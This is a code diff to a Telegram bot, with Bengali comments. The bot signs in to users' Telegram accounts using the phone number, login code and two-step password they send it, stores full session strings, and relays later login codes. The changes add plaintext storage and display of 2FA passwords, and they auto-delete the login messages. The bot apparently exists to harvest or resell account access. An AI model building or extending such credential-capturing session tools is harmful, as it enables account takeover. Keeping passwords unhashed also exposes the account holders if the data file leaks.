@@ -110,8 +110,12 @@ async def start(event):
 @bot.on(events.NewMessage(pattern='➕ New Number Add'))
 async def ask_number(event):
     sender_id = event.sender_id
-    temp_storage[sender_id] = {'step': 'waiting_phone'}
-    await event.respond("দয়া করে আপনার টেলিগ্রাম ফোন নম্বরটি কান্ট্রি কোড সহ পাঠান (যেমন: `+88017xxxxxxxx`):")
+    temp_storage[sender_id] = {
+        'step': 'waiting_phone',
+        'msg_ids': [event.message.id]
+    }
+    msg = await event.respond("দয়া করে আপনার টেলিগ্রাম ফোন নম্বরটি কান্ট্রি কোড সহ পাঠান (যেমন: `+88017xxxxxxxx`):")
+    temp_storage[sender_id]['msg_ids'].append(msg.id)
 
 @bot.on(events.NewMessage(pattern='📂 Your Numbers'))
 async def list_countries(event):
@@ -202,8 +206,8 @@ async def send_phone_number(event):
     
     if sender_id in data and phone in data[sender_id]:
         session_str = data[sender_id][phone]['session']
+        two_fa_password = data[sender_id][phone].get('password', 'N/A')
         
-        # রিকোয়ারমেন্ট অনুযায়ী মেসেজ পরিবর্তন করা হলো
         msg = await event.respond(f"📱 নম্বর: `{phone}`\n\n⏳ **Waiting for login code...**")
         
         otp_code = None
@@ -230,8 +234,13 @@ async def send_phone_number(event):
             pass
 
         if otp_code:
-            # ১০ সেকেন্ড পর অটো ডিলিট হওয়ার লজিক
-            final_msg = await msg.edit(f"📱 নম্বর: `{phone}`\n\n🔑 **Login Code:** `{otp_code}`\n\n⏳ *১০ সেকেন্ড পর ডিলিট হবে...*")
+            # ওটিপি এবং তার নিচে টু-ফ্যাক্টর পাসওয়ার্ড শো করার ব্যবস্থা
+            final_text = f"📱 নম্বর: `{phone}`\n\n🔑 **Login Code:** `{otp_code}`\n"
+            if two_fa_password != 'N/A':
+                final_text += f"🔐 **2FA Password:** `{two_fa_password}`\n"
+            final_text += f"\n⏳ *১০ সেকেন্ড পর ডিলিট হবে...*"
+
+            final_msg = await msg.edit(final_text)
             await asyncio.sleep(10)
             try:
                 await final_msg.delete()
@@ -252,6 +261,11 @@ async def handle_user_input(event):
     if sender_id not in temp_storage:
         return
     
+    # ইউজারের পাঠানো মেসেজ আইডি স্টোর করা যাতে পরে ডিলিট করা যায়
+    if 'msg_ids' not in temp_storage[sender_id]:
+        temp_storage[sender_id]['msg_ids'] = []
+    temp_storage[sender_id]['msg_ids'].append(event.message.id)
+    
     state = temp_storage[sender_id].get('step')
     
     if state == 'waiting_phone':
@@ -259,6 +273,7 @@ async def handle_user_input(event):
         temp_storage[sender_id]['phone'] = phone
         
         waiting_msg = await event.respond("⏳ **Waiting for otp...**")
+        temp_storage[sender_id]['msg_ids'].append(waiting_msg.id)
         
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -268,7 +283,9 @@ async def handle_user_input(event):
             temp_storage[sender_id]['client'] = client
             temp_storage[sender_id]['phone_code_hash'] = sent.phone_code_hash
             temp_storage[sender_id]['step'] = 'waiting_otp'
-            await waiting_msg.edit("✅ ওটিপি পাঠানো হয়েছে। আপনার টেলিগ্রাম অ্যাপে কোডটি আসলে সেটি এখানে দিন:")
+            
+            msg = await event.respond("✅ ওটিপি পাঠানো হয়েছে। আপনার টেলিগ্রাম অ্যাপে কোডটি আসলে সেটি এখানে দিন:")
+            temp_storage[sender_id]['msg_ids'].append(msg.id)
         except Exception as e:
             await client.disconnect()
             del temp_storage[sender_id]
@@ -281,12 +298,14 @@ async def handle_user_input(event):
         
         try:
             await client.sign_in(phone, text, phone_code_hash=phone_code_hash)
-            await finalize_login(event, sender_id, client, phone)
+            await finalize_login(event, sender_id, client, phone, password=None)
         except SessionPasswordNeededError:
             temp_storage[sender_id]['step'] = 'waiting_password'
-            await event.respond("🔒 টু-স্টেপ ভেরিফিকেশন পাসওয়ার্ড দিন:")
+            msg = await event.respond("🔒 টু-স্টেপ ভেরিফিকেশন পাসওয়ার্ড দিন:")
+            temp_storage[sender_id]['msg_ids'].append(msg.id)
         except Exception as e:
-            await event.respond(f"❌ ওটিপি ভুল হয়েছে। আবার সঠিক কোড দিন:")
+            msg = await event.respond(f"❌ ওটিপি ভুল হয়েছে। আবার সঠিক কোড দিন:")
+            temp_storage[sender_id]['msg_ids'].append(msg.id)
 
     elif state == 'waiting_password':
         client = temp_storage[sender_id]['client']
@@ -294,11 +313,13 @@ async def handle_user_input(event):
         
         try:
             await client.sign_in(password=text)
-            await finalize_login(event, sender_id, client, phone)
+            # পাসওয়ার্ড সফলভাবে ভেরিফাই হলে পাসওয়ার্ডটি সেভ করে রাখা হচ্ছে
+            await finalize_login(event, sender_id, client, phone, password=text)
         except Exception as e:
-            await event.respond(f"❌ পাসওয়ার্ড ভুল: আবার সঠিক পাসওয়ার্ড দিন:")
+            msg = await event.respond(f"❌ পাসওয়ার্ড ভুল: আবার সঠিক পাসওয়ার্ড দিন:")
+            temp_storage[sender_id]['msg_ids'].append(msg.id)
 
-async def finalize_login(event, sender_id, client, phone):
+async def finalize_login(event, sender_id, client, phone, password=None):
     session_string = client.session.save()
     country = get_country_name(phone)
     
@@ -309,12 +330,21 @@ async def finalize_login(event, sender_id, client, phone):
         
     data[str_sender_id][phone] = {
         'session': session_string,
-        'country': country
+        'country': country,
+        'password': password if password else 'N/A'
     }
     save_data(data)
     
     await client.disconnect()
+    
+    # লগইন সাকসেস হওয়ার সাথে সাথে প্রসেসিংয়ের সব মেসেজ অটো-ডিলিট করে দেওয়া
     if sender_id in temp_storage:
+        msg_ids = temp_storage[sender_id].get('msg_ids', [])
+        for m_id in msg_ids:
+            try:
+                await bot.delete_messages(sender_id, m_id)
+            except:
+                pass
         del temp_storage[sender_id]
     
     await event.respond(
